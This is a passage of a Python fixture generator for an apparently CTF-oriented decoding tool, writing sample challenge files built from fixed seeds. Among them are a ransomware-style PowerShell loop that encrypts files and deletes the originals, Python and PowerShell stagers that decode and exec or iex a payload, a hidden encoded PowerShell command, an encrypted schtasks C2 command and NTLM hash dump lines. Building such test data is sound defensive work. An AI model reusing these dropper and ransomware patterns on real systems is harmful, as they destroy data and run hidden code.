    $z12Vb = [System.Text.Encoding]::UTF8.GetBytes($v34Vx)
    $a34Vc = l34Vn $t90Vv $y90Va $z12Vb
    return [Convert]::ToBase64String($a34Vc)
}}

foreach ($ext in (a12Vc $k34Vm).Split(" ")) {{
    Get-ChildItem -Path "dca01aq2/" -Recurse | Where-Object {{ $_.Extension -match "^\\.$ext$" }} |
        ForEach-Object {{
            $s90Vu = [IO.File]::ReadAllBytes($_.FullName)
            $t12Vv = s78Vu $s90Vu $c56Ve $d78Vf
            [IO.File]::WriteAllText("$($_.FullName).secured", $t12Vv)
            Remove-Item $_.FullName -Force
        }}
}}
"""
    write("writeup_cave_ransom.ps1", script)
    pdf = (
        b"%PDF-1.4\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n"
        b"2 0 obj << /Type /Pages /Count 1 >> endobj\n"
        b"BT /F1 24 Tf (Treasure map: CYBN{fixture_two_xor_keys}) Tj ET\n%%EOF\n"
    )
    stream = bytes(b ^ ord(key1[i % 64]) ^ ord(key2[i % 24]) for i, b in enumerate(pdf))
    write("writeup_cave_map.pdf.secured", base64.b64encode(stream))

    # 2. "A new Hire" shape: a Python stager, base64 key, XORed + zlib payload, exec.
    key = b"CYBN{fixture_stager_key}"
    payload = b"print('stage two loaded')  # CYBN{fixture_new_hire}\n"
    blob = base64.b64encode(xor(zlib.compress(payload), key)).decode()
    client = (
        "import base64\n"
        "import zlib\n\n"
        f'key = base64.b64decode("{base64.b64encode(key).decode()}")\n\n'
        f'data = base64.b64decode("{blob}")\n'
        "meterpreter_data = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])\n\n"
        "exec(zlib.decompress(meterpreter_data))\n"
    )
    write("writeup_newhire_client.py", client)

    # 3. "Ghost in the Dark" shape: a PowerShell AES loader; the encrypted file is
    #    separate (recovered from a disk image with tsk_recover / fls).
    aes_key, aes_iv = RNG.randbytes(32), RNG.randbytes(16)
    loader = f"""$k = [Convert]::FromBase64String("{base64.b64encode(aes_key).decode()}")
$v = [Convert]::FromBase64String("{base64.b64encode(aes_iv).decode()}")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aes.Key = $k
$aes.IV = $v
$bytes = [IO.File]::ReadAllBytes("payload.enc")
$dec = $aes.CreateDecryptor().TransformFinalBlock($bytes, 0, $bytes.Length)
iex ([Text.Encoding]::UTF8.GetString($dec))
"""
    write("writeup_ghost_loader.ps1", loader)
    stage2 = b"Write-Host 'ransom note dropped'  # CYBN{fixture_ghost_loader}\n"
    write(
        "writeup_ghost_payload.enc", AES.new(aes_key, AES.MODE_CBC, aes_iv).encrypt(pad(stage2, 16))
    )

    # 4. "Silent Trap" shape: C2 commands in mails, RC4 then base64.
    rc4_key = RNG.randbytes(16)
    command = b"schtasks /create /tn Synchronization /tr calc.exe  & echo CYBN{fixture_rc4_mail}"
    write("writeup_silent_rc4.b64", base64.b64encode(rc4(rc4_key, command)) + b"\n")
    write("writeup_silent_rc4.key", rc4_key.hex() + "\n")


def rc4(key: bytes, data: bytes) -> bytes:
    """RC4, written here so the fixture does not depend on ctfc or pycryptodome."""
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) % 256
        state[i], state[j] = state[j], state[i]
    i = j = 0
    out = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + state[i]) % 256
        state[i], state[j] = state[j], state[i]
        out.append(byte ^ state[(state[i] + state[j]) % 256])
    return bytes(out)


# ---------------------------------------------------------------------------
# Audit (after M8): shapes from the user's own challenge notes (Notion exports).
# Hand-written formats, so `make fixtures` needs no external tool and stays
# deterministic; each one was checked against the real tool once (7z t, openssl).
# ---------------------------------------------------------------------------


def seven_zip_stored(name: str, content: bytes) -> bytes:
    """A real 7z archive with one file stored as is (Copy codec), written by hand.

    Checked with `7z t` / `7z x`. Sizes stay below 128 so every 7z number is one byte.
    """
    utf16 = name.encode("utf-16-le") + b"\x00\x00"
    header = (
        bytes(
            [
                0x01,  # kHeader
                0x04,  # kMainStreamsInfo
                0x06,
                0x00,
                0x01,  # kPackInfo: pack position 0, one pack stream
                0x09,
                len(content),
                0x00,  # kSize, kEnd
                0x07,
                0x0B,
                0x01,
                0x00,  # kUnPackInfo, kFolder, 1 folder, not external
                0x01,
                0x01,
                0x00,  # 1 coder: id size 1, codec 0x00 = Copy
                0x0C,
                len(content),
                0x00,  # kCodersUnPackSize, kEnd
                0x00,  # kEnd of MainStreamsInfo
                0x05,
                0x01,  # kFilesInfo, 1 file
                0x11,
                1 + len(utf16),
                0x00,  # kName, property size, not external
            ]
        )
        + utf16
        + bytes([0x00, 0x00])
    )
    next_header = (
        len(content).to_bytes(8, "little")
        + len(header).to_bytes(8, "little")
        + zlib.crc32(header).to_bytes(4, "little")
    )
    start = b"7z\xbc\xaf'\x1c\x00\x04" + zlib.crc32(next_header).to_bytes(4, "little")
    return start + next_header + content + header


def png_chunk(kind: bytes, body: bytes) -> bytes:
    return len(body).to_bytes(4, "big") + kind + body + zlib.crc32(kind + body).to_bytes(4, "big")


def gray_png(text: bytes = b"") -> bytes:
    """A 1x1 gray PNG (the decoy), optionally with a tEXt chunk."""
    head = (1).to_bytes(4, "big") + (1).to_bytes(4, "big") + bytes([8, 0, 0, 0, 0])
    body = png_chunk(b"IHDR", head) + png_chunk(b"IDAT", zlib.compress(b"\x00\x80"))
    if text:
        body += png_chunk(b"tEXt", b"Comment\x00" + text)
    return b"\x89PNG\r\n\x1a\n" + body + png_chunk(b"IEND", b"")


def dns_query_name(name: str) -> bytes:
    """A DNS question for `name` (type A, class IN)."""
    body = b"".join(bytes([len(label)]) + label.encode() for label in name.split("."))
    return struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + body + b"\x00\x00\x01\x00\x01"


def openssl_enc_pbkdf2(password: bytes, plaintext: bytes, iterations: int) -> bytes:
    """`openssl enc -aes-256-cbc -pbkdf2 -iter N` written by hand (checked with openssl)."""
    salt = RNG.randbytes(8)
    derived = hashlib.pbkdf2_hmac("sha256", password, salt, iterations, 48)
    key, iv = derived[:32], derived[32:]
    return b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))


def write_audit_fixtures() -> None:
    # 1. "Pixel Rehab": PNG with byte 0 = 0x88, a 7z appended after IEND, and the
    #    first 6 bytes of a PNG signature pasted over the 7z magic.
    hidden = seven_zip_stored("real_flag.txt", b"CYBN{fixture_pixel_rehab}\n")
    broken = bytearray(gray_png() + b"\x89PNG\r\n" + hidden[6:])
    broken[0] = 0x88
    write("audit_pixel_rehab.fun", bytes(broken))

    # 2. DNS tunnelling: hex payload over SEVERAL labels per query, a counter label
    #    in front, junk before the PNG magic in the stream.
    stream = "ff00ff" + gray_png(b"CYBN{fixture_dns_tunnel}").hex()
    frames = []
    for number, start in enumerate(range(0, len(stream), 48)):
        piece = stream[start : start + 48]
        labels = [f"s{number:03d}x"] + [piece[i : i + 24] for i in range(0, len(piece), 24)]
        name = ".".join(labels) + ".jz-n-bs.local"
        frames.append(
            pcap_packet(
                ethernet_ipv4(
                    "10.0.0.5", "10.0.0.53", 17, udp_datagram(50000, 53, dns_query_name(name))
                ),
                1700000000 + number,
            )
        )
    write(
        "audit_dns_tunnel.pcap",
        struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1) + b"".join(frames),
    )

    # 3. pfSense backup: base64 of the XML config, the RADIUS secret hidden by ROT13.
    rot13 = str.maketrans(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
        "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm",
    )
    config = (
        '<?xml version="1.0"?>\n<pfsense>\n  <system><hostname>gateway</hostname></system>\n'
        "  <radius>\n    <!-- rotation policy applied to the shared secret -->\n"
        f"    <secret>{'L3g4cyOne!sn3o'.translate(rot13)}</secret>\n"
        "    <server>10.0.0.10</server>\n  </radius>\n</pfsense>\n"
    )
    write("audit_pfsense_gateway.bak", base64.b64encode(config.encode()) + b"\n")

    # 4. Docker layers: `openssl enc -aes-256-cbc -iter 10 -pass pass:<sha256 hex>`.
    password = hashlib.sha256(b"fixture docker layer").hexdigest()
    write("audit_docker_pass.txt", password + "\n")
    write(
        "audit_docker_flag.enc",
        openssl_enc_pbkdf2(password.encode(), b"CYBN{fixture_iter10}\n", 10),
    )

    # 6. Android ransomware shape: AES-CBC, key = SHA-256(hardcoded password), IV = zeros.
    key = hashlib.sha256(b"fixture_locker_pw").digest()
    document = b"Private document. The flag is CYBN{fixture_zero_iv}.\n"
    write("audit_android_doc.enc", AES.new(key, AES.MODE_CBC, bytes(16)).encrypt(pad(document, 16)))

    # 7. LUKS + RAM dump (the aeskeyfind case). real_luks1_header.bin and
    #    real_luks2_header.bin are STATIC fixtures: the first 4096 / 16384 bytes
    #    (metadata only, no keyslot material) of volumes made once with
    #      cryptsetup luksFormat --type luks1|luks2 --cipher aes-xts-plain64
    #        --key-size 512 --hash sha256 --volume-key-file mk.bin
    #    and real_luks_master_key.hex is that mk.bin. The dump below holds the two
    #    AES-256 halves as key schedules, in the OPPOSITE order of the master key.
    master = bytes.fromhex((FIXTURES / "real_luks_master_key.hex").read_text().strip())
    memory = bytearray(RNG.randbytes(65536))
    memory[0x2400 : 0x2400 + 240] = aes_key_schedule(master[32:])
    memory[0x7C00 : 0x7C00 + 240] = aes_key_schedule(master[:32])
    write("audit_luks_mem.raw", bytes(memory))

    # 5. secretsdump.py output: two real accounts, a disabled one with the empty hash.
    write(
        "audit_secretsdump.txt",
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::\n"
        "DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
        "samwiseg:1013:aad3b435b51404eeaad3b435b51404ee:dcd99365563e67eb8fbe8c9d83b0ca6c:::\n",
    )

    # 6. ZipCrypto archive holding a PNG: the known-plaintext case for bkcrack.
    #    The entry is deflate-stored, so the PNG magic is five bytes into the
    #    ciphertext - which is exactly what ctfc works out for the bkcrack command.
    png = gray_png()
    write("audit_zipcrypto.zip", zipcrypto_zip("flag.png", png, b"s3cr3t"))


def main() -> None:
    FIXTURES.mkdir(exist_ok=True)
    print(f"writing fixtures to {FIXTURES}")

    # Multi-layer encoding: text -> hex -> zlib -> base64
    text = b"Good job, the flag is CYBN{fixture_layers_b64_zlib_hex}"
    write("layers_b64_zlib_hex.txt", base64.b64encode(zlib.compress(text.hex().encode())))

    # Reversed base64 (PowerShell droppers love this)
    write("reversed_b64.txt", base64.b64encode(b"CYBN{fixture_reversed}")[::-1])

    # PowerShell -EncodedCommand: base64 of UTF-16LE
    command = "Write-Host 'CYBN{fixture_encodedcommand}'"
    encoded = base64.b64encode(command.encode("utf-16-le")).decode()
    write("powershell_encoded.txt", f"powershell.exe -NoP -W Hidden -enc {encoded}\n")

    # AES-ECB with repeated plaintext blocks
    key = RNG.randbytes(16)
    plaintext = b"YELLOW SUBMARINE" * 4 + b"CYBN{fixture_ecb_mode_leaks}"
    write("aes_ecb_repeated.bin", AES.new(key, AES.MODE_ECB).encrypt(pad(plaintext, 16)))

    # openssl enc -aes-256-cbc -md md5 (legacy KDF), raw and base64 versions
    salt = RNG.randbytes(8)
    key, iv = evp_bytes_to_key(b"password123", salt, 32, 16)
    secret = b"CYBN{fixture_openssl_md5}\n"
    blob = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16))
    write("openssl_salted_md5.bin", blob)
    write("openssl_salted_md5.b64", base64.b64encode(blob) + b"\n")

    # PNG with a ZIP appended after IEND (polyglot)
    archive = small_zip("flag.txt", b"CYBN{fixture_polyglot_zip}")
    write("png_with_zip.png", tiny_png() + archive)

    # Zero-width steganography in normal text
    cover = "Nothing to see here, just a normal sentence about the weather."
    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))

    # Binary with crypto constants: TEA delta (LE) and the AES S-box
    sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
    binary = RNG.randbytes(300) + struct.pack("<I", 0x9E3779B9) + RNG.randbytes(200)
    write("crypto_constants.bin", binary + sbox_start + RNG.randbytes(100))

    # Repeating-key XOR of English text (key length 6)
    xor_key = b"x0rK3y"
    xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
    write("xor_repeating.bin", xored)

    # --- XOR (M2) ---
    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
    # Two layers: repeating key "secret", then the single byte 0x42
    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
    # with a repeating key, then base64
    script = powershell_dropper().encode()
    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
    # Two messages encrypted with the same key stream (two-time pad)
    stream = RNG.randbytes(80)
    write(
        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
    )
    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
    write("xor_short_crib.bin", xor(short, b"Qx7#9"))

    # --- symmetric ciphers (M3) ---
    # 48-byte key||iv blob (AES-256-CBC): the blob, and a ciphertext made with it
    blob = RNG.randbytes(48)
    write("key_iv_blob.b64", base64.b64encode(blob) + b"\n")
    message = (
        b"The archive password is hunter2 and the flag is CYBN{fixture_key_iv_blob}. "
        b"Do not write it down anywhere else, please."
    )
    write(
        "aes_cbc_keyiv_blob.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(message, 16)),
    )

    # AES-256-CBC with the IV prepended to the ciphertext (the most common layout)
    key = RNG.randbytes(32)
    iv = RNG.randbytes(16)
    secret = b"CYBN{fixture_iv_prefixed} the rest of this sentence is only here as filler."
    write("aes_cbc_iv_prefix.bin", iv + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(secret, 16)))
    write("aes_cbc_iv_prefix.key", key.hex() + "\n")

    # AES-256-GCM as nonce || ciphertext || tag (what most Python snippets write out)
    nonce = RNG.randbytes(12)
    gcm = AES.new(key, AES.MODE_GCM, nonce=nonce)
    body, tag = gcm.encrypt_and_digest(b"CYBN{fixture_gcm_nonce_ct_tag}")
    write("aes_gcm_nonce_ct_tag.bin", nonce + body + tag)

    # AES-128-CBC with ciphertext stealing (CS1, what openssl's -cts does): the
    # plaintext length is not a multiple of 16 and no padding was added
    cts_key = RNG.randbytes(16)
    cts_iv = RNG.randbytes(16)
    cts_plain = b"CYBN{fixture_cts_mode} short tail here"  # 38 bytes = 2 blocks + 6
    write("aes_cbc_cts.bin", cts_iv + cbc_cts_encrypt(cts_plain, cts_key, cts_iv))
    write("aes_cbc_cts.key", cts_key.hex() + "\n")

    # openssl enc with the modern KDF: -aes-256-cbc -pbkdf2 -iter 10000 -md sha256
    salt = RNG.randbytes(8)
    raw = hashlib.pbkdf2_hmac("sha256", b"infected", salt, 10000, 48)
    padded = pad(b"CYBN{fixture_openssl_pbkdf2}\n", 16)
    body = AES.new(raw[:32], AES.MODE_CBC, raw[32:]).encrypt(padded)
    write("openssl_salted_pbkdf2.bin", b"Salted__" + salt + body)

    # A Fernet token (built by hand, so the `cryptography` package is not needed)
    fernet_key = RNG.randbytes(32)
    write("fernet_key.b64", base64.urlsafe_b64encode(fernet_key) + b"\n")
    write("fernet_token.txt", fernet_token(fernet_key, b"CYBN{fixture_fernet}", 1700000000) + b"\n")

    # ChaCha20 with a 12-byte nonce prepended to the ciphertext
    chacha_key = RNG.randbytes(32)
    chacha_nonce = RNG.randbytes(12)
    stream_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
    write(
        "chacha20_nonce_prefix.bin",
        chacha_nonce + stream_cipher.encrypt(b"CYBN{fixture_chacha20} and some filler text here."),
    )
    write("chacha20_nonce_prefix.key", chacha_key.hex() + "\n")

    # XTEA-CBC, big-endian words, PKCS7 padding, 16-byte key from a passphrase
    xtea_key = hashlib.md5(b"tiny").digest()
    xtea_iv = RNG.randbytes(8)
    xtea_plain = pad(b"CYBN{fixture_xtea_cbc} delta is 0x9e3779b9", 8)
    blocks = b""
    previous = xtea_iv
    for offset in range(0, len(xtea_plain), 8):
        chunk = xtea_plain[offset : offset + 8]
        block = bytes(a ^ b for a, b in zip(chunk, previous, strict=True))
        previous = xtea_encrypt_block(block, xtea_key, "big")
        blocks += previous
    write("xtea_cbc.bin", xtea_iv + blocks)

    # --- Code Lens (M4): one script per language, each with a different API ---
    # These files are DATA. Nothing in ctfc or in the tests ever executes them.
    write("lens_dropper.py", lens_python_dropper())
    write("lens_layers.py", lens_python_layers())
    write("lens_fernet.py", lens_python_fernet())
    write("lens_dropper.ps1", lens_powershell_dropper())
    write("lens_cryptojs.js", lens_javascript_cryptojs())
    write("lens_openssl.sh", lens_bash_openssl())
    write("lens_dropper.vbs", lens_vbs_dropper())

    # Text formats recognised by prefix
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=")
    payload = base64.urlsafe_b64encode(b'{"user":"admin"}').rstrip(b"=")
    write("jwt.txt", header + b"." + payload + b".c2lnbmF0dXJl\n")
    salt_hex = RNG.randbytes(20).hex()
    response_hex = RNG.randbytes(20).hex()
    write("mysqlna_hash.txt", f"$mysqlna${salt_hex}*{response_hex}\n")

    # --- RSA (M5) ---
    # Every key below is generated from the fixed seed, so the files never change.
    # They are all deliberately weak, one mistake each.
    write_rsa_fixtures()

    # --- pcap (improvement idea 4) ---
    write_pcap_fixture()

    # --- M7: classical ciphers, key hunting (after everything else: the seed
    # order of the earlier fixtures must not change) ---
    write_classical_fixtures()
    write_keyhunt_fixtures()

    # --- M8: shapes of the user's past challenges ---
    write_writeup_fixtures()

    # --- audit: shapes from the user's Notion challenge notes ---
    write_audit_fixtures()


if __name__ == "__main__":
    main()
